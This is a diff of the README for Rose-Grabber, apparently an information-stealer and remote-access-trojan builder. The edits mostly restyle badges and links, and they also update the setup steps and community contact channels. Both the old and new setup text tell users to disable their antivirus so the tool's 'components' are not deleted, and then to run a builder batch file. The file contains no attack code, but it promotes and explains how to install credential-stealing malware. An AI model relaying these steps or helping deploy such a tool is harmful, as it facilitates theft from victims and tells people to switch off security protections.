@@ -1,35 +1,28 @@
 <h1 id="top" align="center">
   <br>
-  <a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rosebb.png" alt="R"></a>
+  <a href="https://github.com/DamagingRose/Rose-Grabber">
+    <img src="assets/builder.png" alt="R">
+  </a>
   <br>
 </h1>
 
 <div align="center" style="background-color: #da467d; padding: 20px;">
     <a href="https://discord.gg/sMawrDqnta">
-        <img src="https://img.shields.io/badge/Discord-%238B0000.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
+        <img src="https://img.shields.io/badge/Discord-%23f390fc.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
     </a>
     <a href="https://t.me/rosegrabber">
-        <img src="https://img.shields.io/badge/Telegram-%238B0000.svg?style=for-the-badge&logo=telegram&logoColor=white" alt="Join our Telegram">
+        <img src="https://img.shields.io/badge/Telegram-%23f390fc.svg?style=for-the-badge&logo=telegram&logoColor=white" alt="Join our Telegram">
     </a>
     <br>
-    <a href="https://deepsource.io/gh/DamagingRose/Rose-Grabber/?ref=repository-badge}" target="_blank">
-        <img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Grabber.svg/?label=active+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
-    </a>
-    <a href="https://www.codefactor.io/repository/github/damagingrose/rose-grabber">
-        <img src="https://www.codefactor.io/repository/github/damagingrose/rose-grabber/badge" alt="CodeFactor" />
-    </a>
-    <a href="https://deepsource.io/gh/DamagingRose/Rose-Grabber/?ref=repository-badge}" target="_blank">
-        <img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Grabber.svg/?label=resolved+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
-    </a>
     <br>
-    <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Grabber?color=%238B0000&style=flat-square">
-    <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%238B0000&style=flat-square">
+    <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Top Languages">
+    <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Grabber?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Stars">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Grabber?color=%238B0000&style=flat-square"> 
-    <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%238B0000&style=flat-square">
+    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Commit Activity">
+    <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Grabber?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Last Commit">
     <br>
-    <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%238B0000&style=flat-square">
-    <img src="https://img.shields.io/github/issues-closed/DamagingRose/Rose-Grabber?color=%238B0000&logoColor=%23da467d&style=flat-square">
+    <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Open Issues">
+    <img src="https://img.shields.io/github/issues-closed/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Closed Issues">
     <br>
 </div>
 
@@ -54,15 +47,16 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 
 ### Setup
 
-**Make sure to disable your anti-virus before proceeding, so the important rose components dont get deleted.**
+**Before proceeding, briefly disable your antivirus to avoid accidental removal of important components. Install Python properly, ensuring it's added to PATH. Preferably, use Python 3.11 and uninstall other versions. Thanks!**
 - Download repository [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
-- Extract packed contents. You can find a guide [here](https://www.top-password.com/knowledge/extract-files-from-zip-in-windows-10.html).
+- Extract the zip file.
 - Launch UI by executing [`build.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/builder.bat).
 
-### Issues? Get help!
+### Problems? Get help!
 **You can contact us here:**
 - [Telegram](https://t.me/gumbobr0t)
 - [Discord](https://discord.gg/sMawrDqnta)
+- [Issues](https://github.com/DamagingRose/Rose-Grabber/issues)
 
 ### Docs
 For more guidance on e.g. the rats or the builder, you should check out the [docs](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs) folder.
@@ -72,8 +66,6 @@ For more guidance on e.g. the rats or the builder, you should check out the [doc
 The changelog history can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/CHANGELOG.md).
 
 ### Credits
-
-**We extend our deepest appreciation to these exceptional contributors. Their expertise and dedication have greatly enhanced this project.**
 
 - [xpierroz](https://github.com/xpierroz)
 - [killer](https://github.com/Minecraftkillir)
@@ -87,8 +79,6 @@ The changelog history can be found in our [documentation](https://github.com/Dam
 - [something-0001](https://github.com/smth.py)
 - [rud3p](https://github.com/rud3p)
 
-**Thank you all!**
-
 ### Star Graph
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)]
+[![Star History Chart](https://api.star-history.com/svg?repos=DamagingRose/Rose-Grabber&type=Date)](https://star-history.com/#DamagingRose/Rose-Grabber&Date)
